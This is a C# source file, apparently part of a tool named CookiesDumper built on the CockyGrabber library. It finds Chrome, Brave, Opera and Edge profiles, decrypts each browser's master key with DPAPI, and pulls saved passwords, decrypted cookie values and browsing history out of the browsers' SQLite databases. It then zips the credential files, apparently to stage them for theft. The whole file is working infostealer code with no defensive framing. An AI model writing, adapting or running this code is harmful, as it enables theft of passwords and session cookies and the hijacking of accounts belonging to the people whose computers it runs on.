using CockyGrabber.Utility.Cryptography;
using CockyGrabber.Utility.Cryptography.BouncyCastle;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Net;
using System.Collections.Specialized;
using System.Windows.Forms;
using System.Windows;

namespace CookiesDumper
{
	class utils
	{

	

	



		
		

		public static string appLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData";

		public static List<Password> PassList = new List<Password>();
		public static List<History> HistoryList = new List<History>();
		public static List<Cookie> CookieList = new List<Cookie>();
		public static string[] chromiumBasedBrowsers = new string[] {
			 "\\Local\\Google\\Chrome\\User Data",
			"\\Local\\BraveSoftware\\Brave-Browser\\User Data",
			"\\Roaming\\Opera Software\\Opera Stable",
			"\\Local\\Microsoft\\Edge\\User Data"
		};
		public static byte[] GetKeyBytes(string path) {

			string KeyFile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData" + path;
			string encKey;

			if (!File.Exists(KeyFile)) return null;

			try
			{
				encKey = File.ReadAllText(KeyFile);
				encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
				var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
				return decodedKey;
			}
			catch (FileNotFoundException)
			{

			};

			return null;

		}
		public static string CopyFileDataToFolder(string appendPath,string filename,string ZipDir) {

			String ChromeUserData;
			if (appendPath.Contains("Opera"))
			{
				if (filename.Equals("Cookies")) ChromeUserData = appLocalPath + appendPath + "\\Network\\" + filename;

				else
				ChromeUserData = appLocalPath + appendPath + "\\" + filename;

			}
			else {

				if (filename.Equals("Cookies")) ChromeUserData = appLocalPath + appendPath + "\\Default\\Network\\" + filename;
			    else if (filename.Equals("Local State")) ChromeUserData = appLocalPath + appendPath + "\\" + filename;
				else
				ChromeUserData = appLocalPath +appendPath  + "\\Default" + "\\"  + filename ;

			}
			if (!File.Exists(ChromeUserData)) {

				return null;

			}
			
			String TempFile = appLocalPath  + ZipDir;
			if (File.Exists(TempFile))
			{

				File.Delete(TempFile);

			}

			File.Copy(ChromeUserData, TempFile, true);


			return TempFile;
		}
		public static int GetLogins() {

			//string LoginFile;
			byte[] key;

			foreach (string Path in chromiumBasedBrowsers)
			{

				key = utils.GetKeyBytes(Path + "\\Local State");

				if (key != null)
				{

					try
					{

						if (Path.Contains("Opera"))
						{
							DecryptLogins(appLocalPath + Path + "\\Login Data", key);
						}
						else
						{

							DecryptLogins(appLocalPath + Path + "\\Default\\Login Data", key);
						}
					}
					catch (Exception err)
					{
					}
					//DecryptLogins(appLocalPath + LoginFile, key);

				}
			}
			return 0;

		}
		public static int DecryptLogins(string LogPath,byte[] key) {

			
			
			string cs = $"Data Source=" + LogPath + "; pooling = false"; 
			string stm = "SELECT * FROM logins";
			string hostname;
			string email;
			byte[] password;

			using (var con = new SQLiteConnection(cs))
			using (var cmd = new SQLiteCommand(stm, con))
			{

				con.Open();

				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{

						// Store retrieved information:

						hostname = reader.GetString(1);
						email = reader.GetString(3);
						password = (byte[])reader[5];
						string DecryptedPasswordValue = BlinkDecryptor.DecryptValue((byte[])reader[5], new KeyParameter(key));
						PassList.Add(new Password(hostname, email, DecryptedPasswordValue));
					}
					con.Close();
				}
			}

			//File.Delete(LogPath);

			return 0;

		}
		public static int ParseHistory(string HistoryPath) {

			if (!File.Exists(HistoryPath))return -1 ;


			string cs = $"Data Source=" + HistoryPath + "; pooling = false";
			string stm = "SELECT * FROM urls";
			string Url;
			string Title;
			int VisitCount;

			using (var con = new SQLiteConnection(cs))
			using (var cmd = new SQLiteCommand(stm, con))
			{

				con.Open();

				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{

						// Store retrieved information:

						Url = reader.GetString(1);
						Title = reader.GetString(2);
						VisitCount = reader.GetInt32(3);

						HistoryList.Add(new History(Url, Title, VisitCount));
					}
					con.Close();
				}
			}

			//File.Delete(HistoryPath);


			return 0;
		}

		public static void GetHistory() {

			//string HistoryFile;

			foreach (string Path in chromiumBasedBrowsers)
			{

				try
				{
					if (Path.Contains("Opera"))
					{
						ParseHistory(appLocalPath + Path + "\\History");

					}
					else
					{

						ParseHistory(appLocalPath + Path + "\\Default\\History");

					}
				} catch (Exception err) { 
				
				
				}
				//HistoryFile = utils.CopyFileDataToTemp(Path , "History");	//ParseHistory(HistoryFile);
			}



		}
		public static int  DecryptCookies(string CookiePath,byte[] key) {


			string cs = $"Data Source=" + CookiePath + "; pooling = false";
			string stm = "SELECT * FROM cookies";
			 string HostKey;
		     string Name;
	     	 string Value;
		    string DecryptedCookieValue;
		     string Path;
		     long ExpiresUTC;

			using (var con = new SQLiteConnection(cs))
			using (var cmd = new SQLiteCommand(stm, con))
			{

				con.Open();

				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{


						HostKey = reader.GetString(2);
                        Name = reader.GetString(3);
						Value = reader.GetString(4);
                        Path = reader.GetString(6);
						ExpiresUTC = reader.GetInt64(7);
    					DecryptedCookieValue = BlinkDecryptor.DecryptValue((byte[])reader[5], new KeyParameter(key));
						CookieList.Add(new Cookie(HostKey,Name,Value, DecryptedCookieValue,Path,ExpiresUTC));
					
					}
					con.Close();
				}
			}

			//File.Delete(CookiePath);

			return 0;

		}
		public static void GetCookies() {

			//string CookieFile;
			byte[] key;

			foreach (string Path in chromiumBasedBrowsers)
			{

				key = utils.GetKeyBytes(Path + "\\Local State");
				//	CookieFile = utils.CopyFileDataToTemp(Path, "Cookies");
				if (key != null)
				{

					try
					{

						if (Path.Contains("Opera"))
						{


							DecryptCookies(appLocalPath + Path + "\\Network\\Cookies", key);

						}
						else
						{

							DecryptCookies(appLocalPath + Path + "\\Default\\Network\\Cookies", key);
						}
					} catch (Exception err) { }
				}

			}

		}


		public static string CompressFolder(string Path,string ZipFileName) {
            
			string ZipFilePath = appLocalPath + ZipFileName + ".zip";
			string ZipDir = appLocalPath + ZipFileName;
			string dir = utils.appLocalPath + ZipFileName;
			
			
			if (!Directory.Exists(dir))
			{
				Directory.CreateDirectory(dir);
			}
			utils.CopyFileDataToFolder(Path, "Local State", ZipFileName + "\\Local State");
			utils.CopyFileDataToFolder(Path, "Login Data", ZipFileName + "\\Login Data");
			utils.CopyFileDataToFolder(Path , "Network\\Cookies", ZipFileName + "\\Cookies");
			utils.CopyFileDataToFolder(Path , "History", ZipFileName + "\\History");
			
			if (File.Exists(ZipFilePath)) File.Delete(ZipFilePath);

			ZipFile.CreateFromDirectory(ZipDir, ZipFilePath , CompressionLevel.Fastest, true);

			Directory.Delete(ZipDir,true);

			return ZipFilePath;

		}


	}

}

